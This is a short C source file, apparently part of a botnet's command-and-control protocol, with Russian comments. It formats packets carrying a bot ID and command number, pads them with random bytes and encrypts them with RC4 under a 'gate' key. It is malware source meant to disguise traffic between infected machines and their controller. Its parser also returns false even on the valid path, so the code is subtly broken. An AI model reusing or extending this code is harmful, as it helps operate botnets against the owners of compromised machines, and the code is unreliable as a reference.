#include "protocol.h"
#include "utils.h"
#include "rc4.h"
#include "config.h"

/*
-магическая константа (DWORD)
-версия протокола (DWORD)
-ид бота (DWORD)
-номер команды (DWORD)
-blob с данными (DWORD)(BYTE[n])
-padding (BYTE[n])
*/

void FormatCommand(DWORD bid,DWORD cmd, cmem & blob, cmem & p)
{
	p.free();
	p.push(proto_magic, 4);
	p.push((DWORD)proto_ver);
	p.push(bid);
	p.push(cmd);

	p.push((DWORD)blob.size);

	if (blob.size)
	{
		p.push(blob.data, blob.size);
	}

	int pad_size = random(1, 30);
	while (pad_size)
	{
		p.push((BYTE)random());
		pad_size--;
	}
}

void EncryptCommand(cmem & p)
{
	rc4((byte*)gate_key, lstrlenA(gate_key), p.size, (byte*)p.data, (byte*)p.data);
}

BOOL ParseProto(cmem & p, proto2 & st)
{
	if (p.size >= sizeof(proto))
	{
		proto* pr = (proto*)p.data;
		if (pr->magic == proto_magic_bin)
		{
			if (pr->version == proto_ver)
			{
				if (pr->blob_size <= (p.size - 20))
				{
					//valid
					st.bid = pr->bid;
					st.cid = pr->cid;
					st.version = pr->version;
					st.blob.free();
					st.blob.push(&pr->blob, pr->blob_size);
					return false;
				}
			}
		}
	}
	return false;
}
